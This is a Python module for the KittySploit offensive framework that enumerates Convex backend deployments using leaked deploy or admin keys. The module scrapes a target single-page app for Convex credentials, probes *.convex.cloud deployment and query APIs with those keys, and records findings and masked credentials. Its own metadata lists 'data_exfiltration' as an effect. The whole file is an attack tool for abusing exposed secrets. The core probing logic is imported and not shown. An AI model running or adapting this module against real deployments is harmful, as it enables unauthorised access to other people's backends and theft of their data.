#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Enumerate Convex deployments using leaked deploy/admin keys."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.convex_probe import enumerate_convex_deploy
from lib.scanner.http.vibe_secrets_probe import collect_vibe_http_bodies, mask_secret


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Convex Deploy Key Enumeration",
        "description": (
            "Uses leaked CONVEX_DEPLOY_KEY values to probe deployment APIs and query "
            "surfaces on *.convex.cloud. Auto-discovers from SPA env vars."
        ),
        "author": ["KittySploit Team"],
        "tags": ["convex", "baas", "deploy-key", "enumeration", "auxiliary", "nocode"],
        "modules": [
            "auxiliary/scanner/http/convex_appwrite_pocketbase_api_enum",
            "scanner/http/vibe_stack_secrets_detect",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "data_exfiltration"],
            "expected_requests": 6,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
            "cost": 1.1,
            "noise": 0.3,
            "value": 1.2,
        },
    }

    convex_deployment = OptString("", "Convex deployment name (subdomain)", False)
    deploy_key = OptString("", "Convex deploy/admin key", False)
    auto_discover = OptBool(True, "Scrape SPA for Convex credentials", False)

    def run(self):
        bodies = collect_vibe_http_bodies(self.http_request) if self._to_bool(self.auto_discover) else []
        homepage = next((t for p, t in bodies if p == "/"), "")
        if not homepage and bodies:
            homepage = bodies[0][1]

        self._configure_session()
        findings, creds = enumerate_convex_deploy(
            self.session,
            homepage,
            verify_ssl=self._to_bool(self.verify_ssl),
            deployment=str(self.convex_deployment or "").strip(),
            deploy_key=str(self.deploy_key or "").strip(),
        )

        ok = [f for f in findings if f.get("ok")]
        if not ok:
            print_error("No Convex deployment access (set deploy key or enable auto_discover)")
            return False

        for hit in ok:
            print_success(f"Convex {hit.get('kind')} — {hit.get('deployment')}")

        self.set_info(
            severity="critical" if any(h.get("kind") == "convex_query_with_deploy_key" for h in ok) else "medium",
            reason=f"Convex deploy enum: {len(ok)} hit(s)",
            findings=findings,
            credentials={k: mask_secret(v) if "key" in k else v for k, v in creds.items()},
        )
        return True
